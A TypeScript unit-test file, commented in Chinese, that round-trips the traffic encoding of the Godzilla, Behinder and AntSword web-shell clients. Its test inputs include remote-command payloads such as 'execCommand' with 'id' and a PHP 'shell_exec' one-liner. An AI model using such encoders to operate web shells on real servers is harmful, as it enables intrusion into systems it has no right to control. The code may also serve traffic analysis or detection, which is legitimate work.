/** WebShell 协议编解码单元测试：core/webshell.ts（node:test 零依赖） */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import crypto from 'node:crypto'
import zlib from 'node:zlib'
import {
  GODZILLA_KEY, xorCrypt, godzillaPhpEncode, godzillaPhpDecode, godzillaPhpDecodeFull,
  godzillaJspEncode, godzillaJspDecode, godzillaJspEncodeRaw, godzillaJspDecodeRaw,
  godzillaCshapEncode, godzillaCshapDecode, godzillaCshapEncodeRaw, godzillaCshapDecodeRaw,
  godzillaSerializeParams, godzillaSerializeGzip, godzillaJspEncodeParams,
  behinderAesEncode, behinderAesDecode, behinderXorEncode, behinderXorDecode,
  antSwordPhpEncode,
} from './webshell.ts'

test('xorCrypt：循环 XOR（key[i+1&15] 语义）round-trip', () => {
  const key = '3c6e0b8a9c15224a'
  const plain = Buffer.from('hello world 中文', 'utf8')
  const enc = xorCrypt(plain, key)
  assert.notDeepEqual(enc, plain)
  assert.deepEqual(xorCrypt(enc, key), plain)  // XOR 自反
})

test('godzillaPhpEncode/Decode：base64(XOR) round-trip（带 md5 前后缀响应）', () => {
  const pass = 'pass', key = GODZILLA_KEY
  const plain = Buffer.from('{"status":"ok"}', 'utf8')
  const body = godzillaPhpEncode(plain, key)
  // 模拟服务端：md5(pass+key) 前16 + base64 + 后16
  const md5 = crypto.createHash('md5').update(pass + key, 'utf8').digest('hex')
  const resp = md5.slice(0, 16) + body + md5.slice(16)
  const dec = godzillaPhpDecode(resp, pass, key)
  assert.equal(dec.toString('utf8'), plain.toString('utf8'))
})

test('godzillaJspEncode/Decode：AES-ECB + gzip round-trip', () => {
  const key = GODZILLA_KEY
  const plain = Buffer.from('jsp result 数据', 'utf8')
  const gz = zlib.gzipSync(plain)
  const b64 = godzillaJspEncode(gz, key)
  // 模拟响应：md5 前后缀 + base64
  const md5 = crypto.createHash('md5').update('pass' + key, 'utf8').digest('hex')
  const resp = md5.slice(0, 16) + b64 + md5.slice(16)
  const dec = godzillaJspDecode(resp, key, 'pass')
  assert.equal(dec.toString('utf8'), plain.toString('utf8'))
})

test('godzillaJspEncodeRaw/DecodeRaw：AES-ECB 原始字节 round-trip（含 gzip 解压）', () => {
  const key = GODZILLA_KEY
  const gz = zlib.gzipSync(Buffer.from('raw jsp', 'utf8'))
  const enc = godzillaJspEncodeRaw(gz, key)
  const dec = godzillaJspDecodeRaw(enc, key)
  assert.equal(dec.toString('utf8'), 'raw jsp')
})

test('godzillaCshapEncode/Decode：AES-CBC(IV=key) round-trip', () => {
  const key = GODZILLA_KEY
  const plain = Buffer.from('csharp result', 'utf8')
  const b64 = godzillaCshapEncode(zlib.gzipSync(plain), key)
  const md5 = crypto.createHash('md5').update('pass' + key, 'utf8').digest('hex')
  const resp = md5.slice(0, 16) + b64 + md5.slice(16)
  const dec = godzillaCshapDecode(resp, key, 'pass')
  assert.equal(dec.toString('utf8'), plain.toString('utf8'))
})

test('godzillaSerializeParams：key + 0x02 + 小端长度 + value 格式', () => {
  const buf = godzillaSerializeParams({ methodName: 'execCommand', cmdLine: 'id' })
  // 解析回验：第一个参数 key='methodName'
  const key = buf.subarray(0, 10).toString('utf8')
  assert.equal(key, 'methodName')
  assert.equal(buf[10], 0x02)
  const len = buf.readUInt32LE(11)
  assert.equal(len, 11)  // 'execCommand'
  assert.equal(buf.subarray(15, 26).toString('utf8'), 'execCommand')
})

test('godzillaJspEncodeParams：gzip(serialize) 后 AES 加密（服务端可逆）', () => {
  const key = GODZILLA_KEY
  const enc = godzillaJspEncodeParams({ methodName: 'execCommand', cmdLine: 'ls' }, key)
  // godzillaJspDecode 无 md5 前缀时直接解密并自动解 gzip → 得到 serialize 明文
  const dec = godzillaJspDecode(enc, key)
  assert.ok(dec.toString('utf8').includes('cmdLine'))
  assert.ok(dec.toString('utf8').includes('execCommand'))
})

test('behinderAesEncode/Decode：AES-ECB（key=md5(pass)前16）round-trip', () => {
  const pass = 'rebeyond'
  const plain = Buffer.from('var_dump|echo ok;', 'utf8')
  const enc = behinderAesEncode(plain, pass)
  const dec = behinderAesDecode(enc, pass)
  assert.equal(dec.toString('utf8'), plain.toString('utf8'))
})

test('behinderXorEncode/Decode：XOR（key=md5(pass)前16）round-trip', () => {
  const pass = 'rebeyond'
  const plain = Buffer.from('var_dump|echo xor;', 'utf8')
  const enc = behinderXorEncode(plain, pass)
  const dec = behinderXorDecode(enc, pass)
  assert.equal(dec.toString('utf8'), plain.toString('utf8'))
})

test('antSwordPhpEncode：base64 编码', () => {
  const code = 'echo shell_exec("id" . " 2>&1");'
  assert.equal(Buffer.from(antSwordPhpEncode(code), 'base64').toString('utf8'), code)
})

test('godzillaPhpDecodeFull：完整响应解码（md5 前后缀 + XOR + gzip）', () => {
  const pass = 'pass', key = GODZILLA_KEY
  const plain = Buffer.from('gzip 压缩的完整输出', 'utf8')
  const gz = zlib.gzipSync(plain)
  const body = godzillaPhpEncode(gz, key)
  const md5 = crypto.createHash('md5').update(pass + key, 'utf8').digest('hex')
  const resp = md5.slice(0, 16) + body + md5.slice(16)
  const dec = godzillaPhpDecodeFull(resp, pass, key)
  assert.equal(dec.toString('utf8'), plain.toString('utf8'))
})
